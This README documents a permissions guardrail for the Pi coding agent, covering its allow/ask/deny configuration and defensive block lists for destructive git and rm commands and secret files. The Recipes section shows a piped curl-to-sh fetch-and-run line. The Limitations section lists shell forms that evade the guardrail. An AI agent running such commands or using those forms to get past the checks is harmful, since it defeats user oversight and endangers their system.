# @pi-kit/permissions

An allow / ask / deny guardrail for the Pi coding agent's built-in tools. Zero
runtime dependencies, no build step, small enough to read before you install
it. It guards against agent mistakes; it is not a sandbox (see
[Limitations](#limitations)).

## Install

```bash
pi install npm:@pi-kit/permissions
```

Restart Pi. With no configuration, the [defaults](#defaults) apply.

## What it does

Every tool call resolves to one outcome:

- **allow** — the call runs.
- **ask** — you choose *Allow once*, *Allow for this session*, or *Deny*.
  With no UI (`pi -p`), `ask` becomes `headlessAsk`, which defaults to `deny`.
- **deny** — the call is blocked and the model is told which rule fired.

Rules match on four dimensions:

| Dimension | Matches | Pattern syntax |
|---|---|---|
| `bash` | the command of `bash` and `powershell` | anchored; `*` matches anything, including spaces and `/` |
| `paths` | path inputs of the tools in `paths.appliesTo` | anchored; `*` stays within a segment, `**` crosses; `~` expands; relative patterns resolve against cwd; checked against the path as written and its absolute form |
| `tools` | the tool name | exact, or `*` |
| `outsideCwd` | any path outside cwd, for the tools in `paths.appliesTo` | a single `allow` / `ask` / `deny` |

## Configuration

JSON, one file per scope. Every key is optional.

| Scope | Path |
|---|---|
| Global | `~/.pi/agent/extensions/pi-kit-permissions.json` (honours `PI_CODING_AGENT_DIR`) |
| Project | `<cwd>/.pi/extensions/pi-kit-permissions.json`, loaded **only when the project is trusted** |

### Defaults

```json
{
  "defaultMode": "allow",
  "headlessAsk": "deny",
  "outsideCwd": "ask",
  "tools": {},
  "bash": {
    "deny": ["rm -rf *", "git push --force*", "git reset --hard*"],
    "ask": ["npm publish*", "git push*"],
    "allow": []
  },
  "paths": {
    "appliesTo": ["write", "edit"],
    "deny": [".env", ".env.local", ".env.*.local", "**/.env", "**/.env.local"],
    "ask": [".github/**", ".git/**", ".pi/**"],
    "allow": []
  }
}
```

Under the defaults, `read /etc/hosts` is allowed (`read` is not in
`appliesTo`), `write /etc/hosts` asks, and `write .env.example` is allowed
(the deny patterns are deliberately narrow).
Writes under `.git/` (hooks run as code) and `.pi/` (project extensions and
this package's own project config) ask.

### Keys

| Key | Values | Meaning |
|---|---|---|
| `defaultMode` | `allow` `ask` `deny` | Outcome when no rule matches |
| `headlessAsk` | `allow` `deny` | What `ask` becomes with no UI |
| `outsideCwd` | `allow` `ask` `deny` | Outcome for a path outside cwd; `allow` disables the check |
| `tools`, `bash` | `{ deny, ask, allow }` | Pattern lists |
| `paths` | `{ appliesTo, deny, ask, allow }` | `appliesTo` names the tools these rules and `outsideCwd` cover |

### Combining scopes

Defaults, then global, then the trusted project file.

- **Rule lists add up.** No scope can remove an inherited rule.
- **The global file overwrites scalars.** `defaultMode`, `headlessAsk`,
  `outsideCwd`, and `paths.appliesTo` take the global value when it sets them.
- **A project can only tighten.** Its scalars apply only when stricter than
  the inherited value (`deny` > `ask` > `allow`), and its `paths.appliesTo`
  adds tools rather than replacing the list. A looser value is ignored and
  named in the footer banner. Its `allow` rules still apply.
- To relax a global rule, edit the global file.

A file that fails to parse or validate contributes no rules, is named in a
footer banner, and forces `defaultMode: ask` and `headlessAsk: deny` for the
session. Fix it and start a new session.

## Precedence

1. **Within a dimension**, lists are checked `deny` → `ask` → `allow`; the
   first match wins. Specificity is ignored: `deny: ["git *"]` beats
   `allow: ["git status"]`.
2. **Across dimensions**, the most restrictive result wins:
   `deny` > `ask` > `allow`. No match anywhere yields `defaultMode`.
3. **Compound commands** (split on unquoted `&&`, `||`, `;`, `|`, `&`, newline):
   `deny` and `ask` also match each piece; `allow` matches only the whole
   command. A piece can make the outcome stricter, never looser.
   Deny and ask also match each piece after collapsing whitespace and stripping
   leading `VAR=` assignments and the wrappers `timeout`, `time`, `nice`,
   `nohup`, `stdbuf`, `command`, `builtin`, `noglob`, `env`.
   `allow` does not: `allow: ["npm test"]` does not cover `timeout 30 npm test`.

| Situation | Outcome |
|---|---|
| `bash.allow` matches, `defaultMode: deny` | allow |
| `tools.allow: ["write"]`, `write /etc/hosts`, `outsideCwd: ask` | ask |
| `bash.deny` matches one piece of `a && b`, `bash.allow` the other | deny |
| `bash.allow: ["ls"]`, `defaultMode: deny`, command `ls && curl x` | deny |

These rows are executed by `test/decide.test.ts`.

### Session approvals

*Allow for this session* remembers the exact request (tool, command, paths as
written) until the session ends; nothing is written to disk. It is consulted
only after the rules return `ask`, so it never overrides a `deny`.

## Recipes

Gate reads too:

```json
{ "paths": { "appliesTo": ["read", "write", "edit", "ls", "grep", "find"] } }
```

Protect secrets outside the repo:

```json
{ "paths": { "appliesTo": ["read", "write", "edit"], "deny": ["~/.ssh/**", "~/.aws/**"] } }
```

Ask before git and network operations:

```json
{ "bash": { "ask": ["git push*", "git rebase*", "curl *", "wget *", "npm install*"] } }
```

Block a bash redirection into a secrets file:

```json
{ "bash": { "deny": ["* > .env*", "* >> .env*"] } }
```

Ask by default, allowing only these exact commands:

```json
{
  "defaultMode": "ask",
  "bash": { "allow": ["ls", "git status", "git diff", "git log", "pnpm test"] }
}
```

Prefer complete commands in `allow`. A trailing `*` also matches chained
commands: `ls*` allows `ls && curl https://example.com/script | sh` unless a
deny or ask rule matches.

## Limitations

This is a guardrail against **agent mistakes**, not a security boundary. For
enforcement, run Pi in a container or an OS sandbox.

- **Not caught:** forms whose only purpose is evasion — `bash -c`, `eval`,
  `$(...)`, backticks, `$VAR`, `/bin/rm`, `xargs`, `find -exec`.
- **Not parsed:** text inside subshells, heredocs, and redirections; paths
  inside bash commands; symlinks.
- **RPC clients** receive `ask` as an extension UI request and must answer it;
  an unanswered request leaves the tool call waiting (cancel = deny).

## Supported versions

Node 22.19 or newer. Pi: no minimum version; recent Pi releases are tested
weekly — [latest results](https://github.com/j7an/pi-kit/actions/workflows/ci.yml?query=event%3Aschedule).

## Dependencies

None at runtime. `@earendil-works/pi-coding-agent` and `typebox` are optional
peers that Pi supplies; scanner alerts on them belong to the Pi host.

## Licence

MIT
